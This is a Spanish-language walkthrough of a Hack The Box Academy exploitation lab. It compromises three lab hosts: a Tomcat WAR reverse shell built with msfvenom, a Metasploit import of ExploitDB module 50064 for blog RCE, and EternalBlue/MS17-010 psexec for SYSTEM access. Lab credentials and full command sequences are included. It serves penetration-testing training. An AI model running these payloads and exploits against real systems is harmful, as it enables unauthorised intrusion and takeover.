
# Lab de explotación

{% hint style="danger" %}
**Nota:** Este tipo de técnicas son muy invasivas, ya que vamos a ganar acceso a distintos sistemas, por lo que no podemos utilizar estas técnicas sin un consentimiento o aprobación por parte del objetivo
{% endhint %}

***

## <mark style="color:purple;">Introducción</mark>

Necesitamos poner a prueba nuestras nuevas habilidades para crear y entregar payloads, adquirir un shell interactivo en Windows y Linux, y cómo explotar una aplicación web. Complete los objetivos a continuación para finalizar el contrato.

***

## <mark style="color:purple;">Guión</mark>

El equipo de CAT5 nos ha asegurado un punto de apoyo en la red de `Inlanefreight`. Nuestra responsabilidad es examinar los resultados del reconocimiento que se ejecutó, validar cualquier información que consideremos necesaria, investigar lo que se puede ver y elegir qué exploits, payloads y shells se utilizarán para controlar los objetivos. Necesitaremos ingresar al host base por `RDP` y realizar las acciones necesarias desde allí. A continuación encontrarás las credenciales, direcciones IP y otra información que puede ser necesaria.

***

## <mark style="color:purple;">Objetivos</mark>

* Demostrar tus conocimientos sobre cómo explotar y recibir un shell interactivo desde un `Host o Servidor Windows`
* Demostrar tus conocimientos sobre cómo explotar y recibir un shell interactivo desde un  `Host o Servidor Linux`
* Demostrar tus conocimientos sobre cómo explotar y recibir un shell interactivo desde una `Aplicación Web`
* Demostrar tu capacidad para identificar a quién tiene acceso como usuario a un `entorno de shell` en el host de la víctima.

Completa los objetivos respondiendo las preguntas del desafío.

***

## <mark style="color:purple;">Credenciales y otra información necesaria</mark>

#### Foothold:

* Dirección IP: `10.129.126.181`
* Credenciales: `htb-student`/ `HTB_@cademy_stdnt!` Puede ser utilizado por RDP.

***

## <mark style="color:purple;">Conectividad al Foothold</mark>

Para acceder al entorno del laboratorio de Evaluación de habilidades será necesario el uso de [XfreeRDP](https://manpages.ubuntu.com/manpages/trusty/man1/xfreerdp.1.html) para proporcionar acceso GUI a la máquina virtual. Puede iniciar el cliente `XFreeRDP`  escribiendo lo siguiente en su shell una vez que se genera el objetivo:

```bash
xfreerdp /v:<target IP> /u:htb-student /p:HTB_@cademy_stdnt!
```

Puede encontrar los `target IP`, `Username`y `Password` necesarios a continuación:

* `IP` == 10.129.126.181
* `Username` == htb-student
* `Password` == HTB\_@cademy\_stdnt!

Una vez que inicie la conexión, se le pedirá que ingrese nuevamente las credenciales proporcionadas en la ventana que ve a continuación:

## <mark style="color:purple;">**Iniciar sesión XFreeRDP**</mark>

![imagen](https://academy.hackthebox.com/storage/modules/115/xfree-login.png)

## <mark style="color:purple;">**Hosts de destino**</mark>

![imagen](https://academy.hackthebox.com/storage/modules/115/challenge-map.png)

Los host 1 a 3 serán tus objetivos para este desafío de habilidades. Cada host tiene un vector único para atacar e incluso puede tener más de una ruta incorporada. Las preguntas de desafío a continuación se pueden responder explotando estos tres hosts. Obtenga acceso y enumere estos objetivos.&#x20;

Necesitarás utilizar la PC Foothold proporcionada. Intentar interactuar con los objetivos desde cualquier lugar que no sea el `Foothold` no funcionará. Tenga en cuenta que el host de Foothold tiene acceso a la red interna de inlanefreight ( `172.16.1.0/23`), por lo deberás prestar especial atención a la dirección IP que elijas al iniciar tus listeners.

***

## <mark style="color:purple;">Pistas</mark>

Intenta completar los desafíos por tu cuenta. Si te quedas atascado, consulta los consejos útiles que aparecen a continuación:

<details>

<summary>Host 1</summary>

Este host tiene dos vulnerabilidades de carga. Si observa `status.inlanefreight.local` o busca la IP en el puerto 8080, verá el vector de entrada. Al jugar con uno de ellos, los créditos "tomcat | Tomcatadm" pueden resultar útiles.

</details>

<details>

<summary>Host 2</summary>

¿Se ha tomado el tiempo para validar los resultados del escaneo? ¿Navegaste hasta la página web alojada? `blog.inlanefreight.local` parece un buen espacio para que los miembros del equipo charlen. Si necesita las credenciales para el blog, "`admin:admin123!@#`" se ha entregado a todos los miembros para que editen sus publicaciones. Al menos eso es lo que mostró nuestro reconocimiento.

</details>

<details>

<summary>Host 3</summary>

Este host es vulnerable a un exploit muy común lanzado en 2017. Se sabe que hace que muchos administradores de sistemas se sientan tristes.

</details>

***

## <mark style="color:purple;">Host 1</mark>

### ¿Cuál es el hostname del Host-1?

* Acceso básico con xfreerdp al foothold

<figure><img src="/files/DjrlDGDbor3B1ROTUx63" alt=""><figcaption></figcaption></figure>

En el escritorio tenemos credenciales de acceso que podemos utilizar:

<figure><img src="/files/YMEzojNzn7RX9zS0LO6R" alt=""><figcaption></figcaption></figure>

```
to manage the blog:
- admin / admin123!@#  ( keep it simple for the new admins )

to manage Tomcat on apache
- tomcat / Tomcatadm
```

Abrimos firefox y entramos a la IP del Host-1 (`172.16.1.11:8080`) y nos loguemos con estas credenciales en la parte de `Host Manager`

<figure><img src="/files/N66QFQvRwOx1ZJ1qHt2Z" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/54bAcvvP0oLbe3Kzc2ca" alt=""><figcaption></figcaption></figure>

En la sección `Server Status` conseguimos información relevante de este host y su `hostname`:

<figure><img src="/files/ayWJaQTJIYY4LMcdCrfS" alt=""><figcaption></figcaption></figure>

### Explota el objetivo y gana una sesión de shell. Envíe el nombre de la carpeta ubicada en C:\Shares\\&#x20;

En la parte de administración vemos el vector de entrada para subir una webshell en formato `WAR`:

<figure><img src="/files/sAQ8vNzdFliCcR15KEP5" alt=""><figcaption></figcaption></figure>

Para ello vamos a crear una webshell con `msfvenom` con el siguiente comando:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.1.5 LPORT=9001 -f war -o shell.war

Payload size: 1097 bytes
Final size of war file: 1097 bytes
Saved as: shell.war
```

Y vamos a crear un listener con Metasploit usando `multi/handler`:

```bash
msfconsole
use /multi/handler
set payload java/jsp_shell_reverse_tcp
set LHOST 172.16.1.5
set LPORT 9001
run
```

En este punto, subimos la webshell y tenemos que hacer click para recibir la conexión en nuestro listener:

<figure><img src="/files/LFrb7s3Zg1kM4whRdVFS" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/nZRC8XobilS90QHPTiVk" alt=""><figcaption></figcaption></figure>

Bingo! Obtenemos la conexión y encontramos la carpeta dentro de `C:\Shares`

<figure><img src="/files/zR3MtxZwGhkF8GxehuR9" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:purple;">Host 2</mark>

### ¿Qué distribución de Linux se ejecuta en el Host-2?&#x20;

```bash
sudo nmap -v -sCV blog.inlanefreight.local

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 f6:21:98:29:95:4c:a4:c2:21:7e:0e:a4:70:10:8e:25 (RSA)
|   256 6c:c2:2c:1d:16:c2:97:04:d5:57:0b:1e:b7:56:82:af (ECDSA)
|_  256 2f:8a:a4:79:21:1a:11:df:ec:28:68:c2:ff:99:2b:9a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Inlanefreight Gabber
|_http-favicon: Unknown favicon MD5: 7E765F1C4CB20568118ED55C0B6FFA91
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Concretamente este Host-2 esta usando una distribución Ubuntu de Linux

***

### ¿En qué idioma está escrito el shell que se carga cuando se utiliza el exploit 50064.rb?&#x20;

Vamos a localizar este exploit en nuestro host:

```bash
locate 50064.rb

locate: warning: database ‘/var/cache/locate/locatedb’ is more than 8 days old (actual age is 869.4 days)
/home/administrator/.msf4/modules/blog/50064.rb
/home/administrator/Downloads/50064.rb
/usr/share/exploitdb/exploits/php/webapps/50064.rb
/usr/share/metasploit-framework/modules/exploits/50064.rb
```

```bash
cat /usr/share/exploitdb/exploits/php/webapps/50064.rb
```

<figure><img src="/files/aHdoYTM7CB7Ulw85Htr3" alt=""><figcaption></figcaption></figure>

Este exploit está escrito en PHP

***

### Explota el sitio del blog y establece una sesión de shell con el host de destino. Envíe el contenido de /customscripts/flag.txt

Para ello necesitamos importar el exploit `50064.rb` en Metasploit.

* Primero, necesitamos encontrar la ruta para colocar este archivo:

```bash
searchsploit 50064.rb

------------------------------------------------ ---------------------------------
 Exploit Title                                  |  Path
------------------------------------------------ ---------------------------------
Lightweight facebook-styled blog 1.3 - Remote C | php/webapps/50064.rb
------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

Ahora vamos a importalo en Metasploit de la siguiente manera:

```bash
htb-student@skills-foothold]─[~/.msf4/modules]
└──╼ $cd exploits
┌─[htb-student@skills-foothold]─[~/.msf4/modules/exploits]
└──╼ $mkdir php
┌─[htb-student@skills-foothold]─[~/.msf4/modules/exploits]
└──╼ $cd php
┌─[htb-student@skills-foothold]─[~/.msf4/modules/exploits/php]
└──╼ $mkdir webapps
┌─[htb-student@skills-foothold]─[~/.msf4/modules/exploits/php]
└──╼ $cd webapps
┌─[✗]─[htb-student@skills-foothold]─[~/.msf4/modules/exploits/php/webapps]
└──╼ $cp /usr/share/exploitdb/exploits/php/webapps/50064.rb 50064.rb
┌─[htb-student@skills-foothold]─[~/.msf4/modules/exploits/php/webapps]
└──╼ $ls
50064.rb
```

Ahora vamos a arrancar el exploit con Metasploit:

```bash
msfconsole
msf6 > reload_all
[*] Reloading modules from all module paths...

msf6 > use exploit/php/webapps
[*] Using configured payload php/meterpreter/bind_tcp

Matching Modules
================

   #  Name                       Disclosure Date  Rank       Check  Description
   -  ----                       ---------------  ----       -----  -----------
   0  exploit/php/webapps/50064  2018-12-19       excellent  No     Lightweight facebook-styled blog authenticated remote code execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/php/webapps/50064

[*] Using exploit/php/webapps/50064
msf6 exploit(php/webapps/50064) > 

```

En el listado de credenciales obtuvimos las credenciales para la parte del blog, que es lo que estamos explotando en este Host-2, por lo que las proporcionaremos en la parte de options:

```
to manage the blog:
- admin / admin123!@#
```

```bash
msf6 exploit(php/webapps/50064) > set USERNAME admin
USERNAME => admin
msf6 exploit(php/webapps/50064) > set PASSWORD admin123!@#
PASSWORD => admin123!@#
msf6 exploit(php/webapps/50064) > set RHOSTS 172.16.1.12
RHOSTS => 172.16.1.12
msf6 exploit(php/webapps/50064) > set VHOST blog.inlanefreight.local
VHOST => blog.inlanefreight.local
```

<figure><img src="/files/FvbqloXrabhn3EOXiuJ2" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/AnvT5DCuWBsHQYERRr0i" alt=""><figcaption></figcaption></figure>

Se nos abre correctamente una sesión de Meterpreter y accedemos correctamente al contenido de `/customscripts/flag.txt`

<figure><img src="/files/e2Wqw2UbPP6ujLVmos2U" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:purple;">Host 3</mark>

### ¿Cuál es el hostname de Host-3?

Vamos con el tercer host, con la IP `172.16.1.13`

```bash
nmap -v -sCV 172.16.1.13

PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: 172.16.1.13 - /
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-03-05T19:50:06
|_  start_date: 2024-03-05T17:51:53
|_clock-skew: mean: 2h39m59s, deviation: 4h37m07s, median: 0s
| nbstat: NetBIOS name: SHELLS-WINBLUE, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:75:6c (VMware)
| Names:
|   SHELLS-WINBLUE<00>   Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|_  SHELLS-WINBLUE<20>   Flags: <unique><active>
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: SHELLS-WINBLUE
|   NetBIOS computer name: SHELLS-WINBLUE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-03-05T11:50:06-08:00

```

El hostname de este host es: `SHELLS-WINBLUE`

***

### Explote y obtenga una sesión de shell con el Host-3. Luego envíe el contenido de C:\Users\Administrator\Desktop\Skills-flag.txt

Observamos que es un host windows bastante antiguo, por lo que a simple vista parece vulnerable a EternalBlue. Vamos a testearlo con Metasploit:

```bash
msfconsole
msf6 > search eternal

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution

```

Concretamente vamos a utilizar el exploit 1: `exploit/windows/smb/ms17_010_psexec`

<figure><img src="/files/F8yVl29GPgo6YSuQ6TR3" alt=""><figcaption></figcaption></figure>

Bingo! Obtenemos la sesión de Meterpreter como `SYSTEM`, y podríamos hacer lo que queramos en el sistema.

<figure><img src="/files/CUlhpDvMFP1z0AqZYcgN" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/V9Nf3gFbVi6GesA7HTh8" alt=""><figcaption></figcaption></figure>
